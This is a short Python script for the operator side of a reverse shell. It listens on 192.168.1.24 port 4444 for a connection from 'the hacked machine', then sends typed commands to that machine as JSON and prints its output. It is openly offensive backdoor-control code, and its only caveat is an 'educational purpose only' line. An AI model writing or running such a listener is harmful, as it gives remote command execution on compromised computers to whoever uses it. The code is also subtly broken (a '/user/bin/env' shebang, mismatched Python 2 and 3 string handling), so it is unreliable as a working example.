#!/user/bin/env python
"""
Author：Seldon Pang

Listener for incoming connection from the hacked machine
Please use for educational purpose only...
"""

import socket
import json


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connection.")
        self.connection, address = listener.accept()
        print("[+] Got a connection from " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remote_command(self, command):
        self.reliable_send(command)
        return self.reliable_receive()

    def run(self):
        while True:
            command = input(">> ")
            result = self.execute_remote_command(command)
            print(result)


# Replace ip and port of your choice
my_listener = Listener("192.168.1.24", 4444)
my_listener.run()
